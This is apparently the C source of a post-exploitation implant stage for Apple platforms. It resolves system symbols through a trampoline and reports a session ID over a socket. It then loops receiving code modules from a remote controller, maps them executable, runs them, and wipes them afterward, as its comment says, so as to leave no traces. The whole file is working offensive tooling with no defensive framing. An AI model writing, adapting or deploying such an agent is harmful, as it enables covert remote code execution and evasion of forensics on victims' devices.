#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <payload.h>

typedef struct {
    void *entry;
    int fd;
    char *session_id;
    void *dlopen;
    void *dlsym;
} args_t, *args_p;

typedef void (module_entry_t)(void *entry, agent_p agent);

bool load_trampoline(args_p args, trampoline_p trampoline);
agent_p load_agent(args_p args, trampoline_p trampoline);
bool send_session_id(agent_p agent);
void enable_log_null_redirection(agent_p agent);
void disable_log_null_redirection(agent_p agent);
void serve(agent_p agent);


void *start(args_p args) {
    trampoline_t trampoline;
    agent_p agent = NULL;

    if (load_trampoline(args, &trampoline) == false)
        return NULL;

    agent = load_agent(args, &trampoline);
    trampoline.free(args);

    if (agent == NULL)
        return NULL;

    if (send_session_id(agent) == false)
        return NULL;

    log_info("-- accepting modules --");
    serve(agent);
    return NULL;
}

#define load_sym(n)                                                             \
    do {                                                                        \
        trampoline->n = trampoline->dlsym(foundation, #n);                      \
        if (trampoline->n == NULL) {                                            \
            if (trampoline->dprintf != NULL)                                    \
                trampoline->dprintf(1, "[!] failed to load symbol: %s\n", #n);  \
            return false;                                                       \
        }                                                                       \
    } while (false);

#define load_local(n, cast) trampoline->n = (cast)PTRAUTH_SIGN_UNAUTHENTICATED_LOCAL_FUNC(args->entry, n)

bool load_trampoline(args_p args, trampoline_p trampoline)
{
    trampoline->dlopen = args->dlopen;
    trampoline->dlsym = args->dlsym;

    // use foundation as it re-exports all the symbols were looking for
    void *foundation = trampoline->dlopen(
        "/System/Library/Frameworks/Foundation.framework/Foundation",
        RTLD_NOW
    );

    if (foundation == NULL)
        return false;
    
    load_sym(dprintf);
    load_sym(errno);
    load_sym(strerror);

    load_sym(free);
    load_sym(malloc);
    load_sym(memcpy);
    load_sym(memset);

    load_sym(mach_task_self);
    load_sym(vm_page_mask);
    load_sym(vm_allocate);
    load_sym(vm_deallocate);
    load_sym(vm_protect);

    load_sym(objc_msgSend);
    load_sym(objc_msgSendSuper2);
    load_sym(objc_getClass);
    load_sym(sel_registerName);
    load_sym(NSTemporaryDirectory);

    load_sym(objc_allocateClassPair);
    load_sym(objc_registerClassPair);
    load_sym(class_addMethod);

    load_sym(class_addIvar);
    load_sym(class_getInstanceVariable);
    load_sym(object_getIvar);
    load_sym(object_setIvar);

    load_sym(strlen);
    load_sym(strdup);

    load_sym(stat);
    load_sym(open);
    load_sym(close);
    load_sym(remove);

    load_sym(dup);
    load_sym(dup2);

    load_sym(read);

    load_sym(recv);
    load_sym(send);

    load_sym(sleep);

    load_sym(dispatch_get_global_queue);

    load_local(enable_log_null_redirection, void (*)(void *));
    load_local(disable_log_null_redirection, void (*)(void *));

    trampoline->dprintf(1, "[*] trampoline load done\n");
    return true;
}
#undef load_sym
#undef load_local

agent_p load_agent(args_p args, trampoline_p trampoline)
{
    agent_p agent = NULL;

    if ((agent = trampoline->malloc(sizeof(agent_t))) == NULL) {
        trampoline->dprintf(1, "[!] failed to allocate agent\n");
        return NULL;
    }

    trampoline->memcpy(agent, trampoline, sizeof(trampoline_t));
    
    agent->fd = args->fd;
    agent->session_id = args->session_id;
    agent->stderr_fd = agent->trampoline.dup(STDERR_FILENO);
    agent->stdout_fd = agent->trampoline.dup(STDOUT_FILENO);

    log_info("agent load done");
    return agent;
}

bool send_session_id(agent_p agent)
{
    log_info("sending session id: %s", agent->session_id);

    uint64_t sid_size = agent->trampoline.strlen(agent->session_id);
    bool ret = (
        agent->trampoline.send(agent->fd, &sid_size, sizeof(sid_size), 0) > 0 &&
        agent->trampoline.send(agent->fd, agent->session_id, sid_size, 0) > 0
    );

    if (ret == false)
        log_error("failed to send session id: %s", agent->trampoline.strerror(*(agent->trampoline.errno)));

    return ret;
}

void enable_log_null_redirection(agent_p agent)
{
    int dev_null = -1;

    if ((dev_null = agent->trampoline.open("/dev/null", O_WRONLY)) < 0) {
        log_error("Failed to open /dev/null. Skipping stdout/stderr redirection");
        return;
    }

    agent->trampoline.dup2(dev_null, STDERR_FILENO);
    agent->trampoline.dup2(dev_null, STDOUT_FILENO);
    agent->trampoline.close(dev_null);
}

void disable_log_null_redirection(agent_p agent)
{
    agent->trampoline.dup2(agent->stderr_fd, STDERR_FILENO);
    agent->trampoline.dup2(agent->stdout_fd, STDOUT_FILENO);
}

void serve(agent_p agent)
{
    mach_port_t task = agent->trampoline.mach_task_self();
    module_entry_t *entry = NULL;
    vm_address_t module = 0;
    uint64_t module_size = 0;
    ssize_t recv_ret = 0;
    kern_return_t vm_ret = -1;

    while (true) {
        log_info("Fetching module");

        // read module size
        recv_ret = agent->trampoline.recv(
            agent->fd,
            &module_size,
            sizeof(module_size),
            MSG_WAITALL
        );

        if (recv_ret <= 0) {
            log_error("Failed to read module size: %s", agent->trampoline.strerror(*(agent->trampoline.errno)));
            break;
        }

        log_info("Module size: %llu", module_size);

        if (module_size <= 0) {
            log_error("Invalid module size, skipping");
            continue;
        }

        // alloc module memory
        vm_ret = agent->trampoline.vm_allocate(
            task,
            &module,
            mach_vm_round_page(module_size),
            VM_FLAGS_ANYWHERE
        );

        if (vm_ret != KERN_SUCCESS) {
            log_error("Failed to allocate module memory, bailing..");
            break;
        }

        // read module data
        recv_ret = agent->trampoline.recv(
            agent->fd,
            (void *)module,
            module_size,
            MSG_WAITALL
        );

        if (recv_ret <= 0) {
            log_error("Failed to read module data, bailing..");
            break;
        }

        log_info("Received module");

        // set module memory as r^x
        vm_ret = agent->trampoline.vm_protect(
            task,
            module,
            mach_vm_round_page(module_size),
            0,
            VM_PROT_READ | VM_PROT_EXECUTE
        );

        if (vm_ret != KERN_SUCCESS) {
            log_error("Failed to set module memory protection, bailing..");
            break;
        }

        log_info("Executing module");
        entry = (module_entry_t *)PTRAUTH_SIGN_UNAUTHENTICATED_FUNC(module);
        entry((void *)module, agent);

        // set module memory as rw^
        vm_ret = agent->trampoline.vm_protect(
            task,
            module,
            mach_vm_round_page(module_size),
            0,
            VM_PROT_READ | VM_PROT_WRITE
        );

        // don't leave traces
        if (vm_ret == KERN_SUCCESS)
            agent->trampoline.memset((void *)module, 0, mach_vm_round_page(module_size));

        // deallocate module memory
        // ignore return value
        agent->trampoline.vm_deallocate(
            task,
            module,
            mach_vm_round_page(module_size)
        );
    }
}
